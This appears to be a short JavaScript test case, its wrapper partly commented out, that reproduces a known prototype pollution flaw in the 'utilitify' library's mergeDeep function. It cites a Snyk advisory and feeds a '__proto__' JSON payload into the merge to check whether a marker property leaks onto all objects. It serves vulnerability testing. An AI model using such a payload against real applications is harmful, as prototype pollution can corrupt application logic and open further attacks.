// //https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
// test("prototype pollution in utilitify", () => {
  const { mergeDeep } = require("utilitify");
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';

console.log({}.polluted);

  var result = mergeDeep(
    { a: { b: { c: "c", d: "d" } } },
    { a: { b: JSON.parse(malicious_payload) } }
  );

console.log({}.polluted);
// });
